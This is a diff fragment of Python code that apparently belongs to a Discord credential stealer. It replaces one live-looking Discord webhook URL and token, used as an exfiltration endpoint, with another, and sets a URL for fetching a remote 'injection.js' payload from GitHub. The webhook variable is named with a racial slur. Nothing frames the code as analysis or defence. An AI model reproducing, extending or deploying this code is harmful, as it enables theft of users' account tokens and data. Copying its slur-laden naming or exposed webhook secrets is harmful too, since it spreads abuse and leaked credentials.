@@ -98,7 +98,7 @@ wordsresp = requests.get(words)
 words = wordsresp.text
 
 h00k = ""
-nigga = "https://discord.com/api/webhooks/1181952117662027828/5qckLO1f7gOtcmbt6HhAKjZHK3SJtYY8JbbmilXjUjVGXgSChe3VCqJpEoYXCQpuIcw4"
+nigga = "https://discord.com/api/webhooks/1181981724431884469/dGjB59xwmQA0fbRb7dM9IKJ9RYijuS0pDMPiwQa95ttsr9mZFrCIQAFQcG235-EhhDth"
 inj3c710n_url = f"https://raw.githubusercontent.com/wtf{mname}wtf/index/main/injection.js"
 DETECTED = False
 
